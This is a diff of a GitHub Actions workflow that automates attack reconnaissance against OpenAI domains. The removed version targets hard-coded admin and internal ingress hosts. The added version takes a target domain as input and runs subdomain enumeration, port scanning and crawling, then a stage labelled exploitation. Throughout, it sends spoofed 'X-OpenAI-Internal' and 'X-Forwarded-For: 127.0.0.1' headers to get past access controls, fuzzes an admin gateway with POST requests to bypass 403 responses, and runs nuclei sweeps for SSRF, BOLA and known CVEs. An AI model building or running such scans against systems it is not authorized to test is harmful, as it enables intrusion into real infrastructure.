@@ -1,75 +1,82 @@
-name: OpenAI-Deep-Scan
+name: OpenAI-Max-Coverage-Security-Engine
+
 on:
   workflow_dispatch:
+    inputs:
+      target_domain:
+        description: 'Domain to hunt (e.g., openai.com)'
+        required: true
+        default: 'openai.com'
 
 jobs:
-  hyper-hunt:
+  security-intel:
     runs-on: ubuntu-latest
+    timeout-minutes: 180 # Increased for deep crawling
+
     steps:
-      - name: Checkout
-        uses: actions/checkout@v4
+    - name: Checkout
+      uses: actions/checkout@v4
 
-      - name: Install Advanced Arsenal
-        run: |
-          go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
-          go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
-          go install -v github.com/ffuf/ffuf/v2@latest
-          pip install arjun
-          sudo mv ~/go/bin/* /usr/local/bin/
-          mkdir -p wordlists
-          # Using a more targeted API wordlist for faster hits
-          curl -s https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/api/api-endpoints-res.txt -o wordlists/api.txt
-          curl -s https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt -o wordlists/common.txt
+    - name: Install Full Arsenal
+      run: |
+        sudo apt update && sudo apt install -y jq parallel nmap dnsutils
+        # ProjectDiscovery Suite
+        go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
+        go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
+        go install -v github.com/projectdiscovery/katana/cmd/katana@latest
+        go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
+        go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest
+        # Fuzzing tools
+        go install -v github.com/ffuf/ffuf/v2@latest
+        pip install arjun
+        sudo mv ~/go/bin/* /usr/local/bin/
 
-      - name: Phase 1:Aggressive Bypass & Method Tampering
-        run: |
-          cat <<EOF > master_targets.txt
-          https://api.openai.com/v1/completionsinternal
-          https://admin.unified-8.api.openai.com
-          https://higherlevelapi.unified-8.api.openai.com
-          https://chat.gateway.unified-79.api.openai.com
-          https://memos.auth.ingress.sodium.sci.openai.org
-          https://large-langdemo-external-access.auth.ingress.sodium.sci.openai.org
-          https://openai-all.auth.ingress.sodium.sci.openai.org
-          https://wiki-browser-contractors.auth.ingress.sodium.sci.openai.org
-          https://infra-monitoring.auth.ingress.sulfur.sci.openai.org
-          https://auth.openai.com
-          https://academy.openai.com
-          EOF
+    # ---------------- RECON ----------------
 
-          # Testing multiple headers AND path normalization (//) at once
-          httpx -l master_targets.txt -threads 50 \
-            -H "X-OpenAI-Internal: true" \
-            -H "X-Forwarded-For: 127.0.0.1" \
-            -H "X-Original-URL: /" \
-            -path "//" \
-            -sc -cl -title -o bypass_results.txt
+    - name: Asset Discovery (Subdomains & Port Scan)
+      run: |
+        echo "${{ github.event.inputs.target_domain }}" > scope.txt
+        # Find all subdomains
+        subfinder -dL scope.txt -all -silent -o subs.txt
+        # Port scan the findings to find hidden dev/admin panels
+        naabu -l subs.txt -top-ports 100 -silent -o ports.txt
+        # Check for live web services
+        httpx -l ports.txt -sc -cl -title -td -silent -o live.txt
 
-      - name: Phase 2:Vulnerability Sweep (SSRF/BOLA)
-        run: |
-          # Adding -itags to focus specifically on high-value API vulnerabilities
-          nuclei -l master_targets.txt -severity critical,high -rl 50 -o nuclei_results.txt
+    - name: Surface Mapping (Katana Crawling)
+      run: |
+        # Crawl for hidden API endpoints and JS files
+        katana -l live.txt -jc -kf -d 3 -silent -o endpoints.txt
 
-      - name: Phase 3:Verb Tampering Fuzzing
-        run: |
-          # Testing POST and PUT on the admin gateway, which often bypasses 403s on GET
-          ffuf -w wordlists/api.txt -u "https://admin.unified-8.api.openai.com/FUZZ" \
-            -X POST -H "Content-Type: application/json" -d '{"test":"test"}' \
-            -mc 200,401,500 -maxtime 300 -o api_fuzz_results.json
+    # ---------------- EXPLOITATION ----------------
 
-      - name: Phase 4:Full Path Discovery
-        run: |
-          # Looking for hidden directories on the Sci-Ingress endpoints
-          ffuf -w wordlists/common.txt -u "https://memos.auth.ingress.sodium.sci.openai.org/FUZZ" \
-            -mc 200,401,500 -t 50 -maxtime 200 -o ingress_fuzz.json
+    - name: Deep 403/404 Bypass Sweep
+      run: |
+        # Targeting the endpoints Katana found with our bypass headers
+        # We look for anomalies in Content-Length
+        httpx -l endpoints.txt -path "//" \
+          -H "X-OpenAI-Internal: true" \
+          -H "X-Forwarded-For: 127.0.0.1" \
+          -sc -cl -title -o bypass_findings.txt
 
-      - name: Archive Results
-        uses: actions/upload-artifact@v4
-        with:
-          name: deep-scan-evidence
-          path: |
-            bypass_results.txt
-            nuclei_results.txt
-            api_fuzz_results.json
-            ingress_fuzz.json
-            
+    - name: Full Vulnerability Sweep (Nuclei)
+      run: |
+        # Scanning for known CVEs, BOLA, and SSRF
+        nuclei -l live.txt -severity critical,high,medium -o nuclei_findings.txt
+
+    # ---------------- REPORTING ----------------
+
+    - name: Build Bug Report
+      run: |
+        mkdir -p results
+        cp *.txt results/ || true
+        # Create a summary of potential high-value hits
+        grep "200" results/bypass_findings.txt > results/POSSIBLE_BUGS.md || echo "No direct bypass yet" > results/POSSIBLE_BUGS.md
+        tar -czf security-results.tar.gz results
+
+    - name: Upload Evidence
+      uses: actions/upload-artifact@v4
+      with:
+        name: full-recon-pack
+        path: security-results.tar.gz
+        
